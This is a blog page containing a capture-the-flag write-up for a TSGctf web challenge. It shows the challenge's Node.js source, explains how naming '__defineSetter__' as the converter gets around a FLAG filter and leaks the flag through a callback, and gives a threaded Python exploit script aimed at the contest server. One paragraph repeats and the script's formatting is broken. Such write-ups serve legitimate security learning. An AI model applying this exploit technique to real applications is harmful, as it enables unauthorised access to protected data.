<!DOCTYPE html>
<html lang="en">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <title>TSGctf web ~ Xiaotan</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >

<link rel="stylesheet" href="/css/main.css"  >


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >


<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">Categories</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background"
         style="background: url('/img/bg_img.jpg')no-repeat center center;
           background-size: cover;
           background-attachment: fixed;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  Tuesday, July 14th 2020, 9:59 am
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    808 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      5 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <p>TSGctf web</p>
<p>Code：</p>
<pre><code>const fastify = require(&#39;fastify&#39;);
const nunjucks = require(&#39;nunjucks&#39;);
const crypto = require(&#39;crypto&#39;);


const converters = {};

const flagConverter = (input, callback) =&gt; {
  const flag = &#39;*** CENSORED ***&#39;;
  callback(null, flag);
};

const base64Converter = (input, callback) =&gt; {
  try {
    const result = Buffer.from(input).toString(&#39;base64&#39;);
    callback(null, result)
  } catch (error) {
    callback(error);
  }
};

const scryptConverter = (input, callback) =&gt; {
  crypto.scrypt(input, &#39;I like sugar&#39;, 64, (error, key) =&gt; {
    if (error) {
      callback(error);
    } else {
      callback(null, key.toString(&#39;hex&#39;));
    }
  });
};


const app = fastify();
app.register(require(&#39;point-of-view&#39;), {engine: {nunjucks}});
app.register(require(&#39;fastify-formbody&#39;));
app.register(require(&#39;fastify-cookie&#39;));
app.register(require(&#39;fastify-session&#39;), {secret: Math.random().toString(2), cookie: {secure: false}});

app.get(&#39;/&#39;, async (request, reply) =&gt; {
  reply.view(&#39;index.html&#39;, {sessionId: request.session.sessionId});
});

app.post(&#39;/&#39;, async (request, reply) =&gt; {
  if (request.body.converter.match(/[FLAG]/)) {
    throw new Error(&quot;Don&#39;t be evil :)&quot;);
  }

  if (request.body.input.length &lt; 10) {
    throw new Error(&#39;Too short :(&#39;);
  }

  if (request.body.input.length &gt; 1000) {
    throw new Error(&#39;Too long :(&#39;);
  }

  converters[&#39;base64&#39;] = base64Converter;
  converters[&#39;scrypt&#39;] = scryptConverter;
  converters[`FLAG_${request.session.sessionId}`] = flagConverter;

  const result = await new Promise((resolve, reject) =&gt; {
    converters[request.body.converter](request.body.input, (error, result) =&gt; {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    });
  });

  reply.view(&#39;index.html&#39;, {
    input: request.body.input,
    result,
    sessionId: request.session.sessionId,
  });
});

app.setErrorHandler((error, request, reply) =&gt; {
  reply.view(&#39;index.html&#39;, {error, sessionId: request.session.sessionId});
});

app.listen(59101, &#39;0.0.0.0&#39;);</code></pre><p>I never expected to be able to read JS, but because of the foundation of learning other languages, I was able to understand this simple code, so I wanted others to try it out.</p>
<p>1.By reading the source code, we can easily find several key points.</p>
<pre><code>const flagConverter = (input, callback) =&gt; {
  const flag = &#39;*** CENSORED ***&#39;;
  callback(null, flag);
};</code></pre><pre><code>app.post(&#39;/&#39;, async (request, reply) =&gt; {
  if (request.body.converter.match(/[FLAG]/)) {
    throw new Error(&quot;Don&#39;t be evil :)&quot;);
  }</code></pre><pre><code> converters[&#39;base64&#39;] = base64Converter;
  converters[&#39;scrypt&#39;] = scryptConverter;
  converters[`FLAG_${request.session.sessionId}`] = flagConverter;</code></pre><p>So we need to bypass FLAG filtering. But I know little about JS. I didn’t know until after the game:</p>
<ol>
<li>Objects have multiple intrinsic JS function, one of them can be used to spit out the flag in errors :)</li>
</ol>
<pre><code>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineSetter__</code></pre><p>The defineSetter function of any object is way to do extra things in callback when a values are assigned to its keys.</p>
<pre><code>var o = {};
o.__defineSetter__(&#39;key&#39;, function(value) { //we access value in callback });</code></pre><p>So following code</p>
<pre><code>converters[request.body.converter](request.body.input, (error, result) =&gt; {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    });</code></pre><p>with <code>request.body.converter = __defineSetter__</code> and <code>request.body.input = FLAG_sessionId</code></p>
<p>will assign following callback for whenever converter object gets key <code>FLAG_sessionId</code> assigned a value.</p>
<pre><code>(error, result) =&gt; {
      if (error) {
        reject(error);
      } else {
        resolve(result);
      }
    });</code></pre><p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
<p>In the first request, We just assign the callback and the Promise does not gets resolved so we are stuck at <code>const result = await new Promise((resolve, reject)</code></p>
<p>In the second consecutive request, The code <code>converters[</code>FLAG_${request.session.sessionId}<code>] = flagConverter;</code></p>
<p>will assign the value <code>flagConverter</code> function to our unique key for which we have set a callback, this <code>flagConverter</code> function will get passed down to callback as error and Our Promise will get rejected and the result gets assign with the whole function, and this result gets spit out in response to our first request which was waiting for this to happen.</p>
<pre><code class="python">import threading
import requests
import time 
cookie = {&quot;sessionId&quot; : &quot;HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa.YTlYOIhk52YHs3NzP%2FFPuu6y7MK1ev6uX21jHbgxMXE&quot;}
def sendPayload():    
    r = requests.post(&quot;http://34.85.124.174:59101&quot;,json=       {&quot;converter&quot;:&quot;__defineSetter__&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;},cookies=cookie)    
    print(r.text) threading.Thread(target=sendPayload).start()time.sleep(1)requests.post(&quot;http://34.85.124.174:59101&quot;,json={&quot;converter&quot;:&quot;base64&quot;,&quot;input&quot;:&quot;FLAG_HcDcdC_lhEJjZPCM7S7nqdgi0kr32rYa&quot;},cookies=cookie)</code></pre>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
            
            </p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
      <br><br>
      
      

    
  </div>
</div>

    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  <footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    <br>

    
  
    <!-- 不蒜子统计PV -->
    
    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
  
  
    <!-- 不蒜子统计UV -->
    
    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
  
  <br>



    

  </div>
</footer>

<!-- SCRIPTS -->
<script src="/lib/jquery/jquery.min.js" ></script>
<script src="/lib/popper/popper.min.js" ></script>
<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
<script src="/js/main.js" ></script>


  <script src="/js/lazyload.js" ></script>



  
    <script src="/lib/tocbot/tocbot.min.js" ></script>
  
  <script src="/js/post.js" ></script>



  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>



  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>


<!-- Plugins -->


  

  

  

  

  




  <script src="/lib/prettify/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="/lib/typed/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "TSGctf web&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="/lib/anchor/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "false",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>





  
  
    <script type="text/javascript">
      //定义获取词语下标
      var a_idx = 0;
      jQuery(document).ready(function ($) {
        //点击body时触发事件
        $("body").click(function (e) {
          //需要显示的词语
          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
          //设置词语给span标签
          var $i = $("<span/>").text(a[a_idx]);
          //下标等于原来下标+1  余 词语总数
          a_idx = (a_idx + 1) % a.length;
          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
          //获取x和y的指针坐标
          var x = e.pageX, y = e.pageY;
          //在鼠标的指针的位置给$i定义的span标签添加css样式
          $i.css({
            "z-index": 999,
            "top": y - 20,
            "left": x,
            "position": "absolute",
            "font-weight": "bold",
            "color": rand_color()
          });
          // 随机颜色
          function rand_color() {
            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
          }
          //在body添加这个标签
          $("body").append($i);
          //animate() 方法执行 CSS 属性集的自定义动画。
          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
          $i.animate({
            //将原来的位置向上移动180
            "top": y - 180,
            "opacity": 0
            //1500动画的速度
          }, 1500, function () {
            //时间到了自动删除
            $i.remove();
          });
        });
      })
      ;
    </script>
  







</body>
</html>
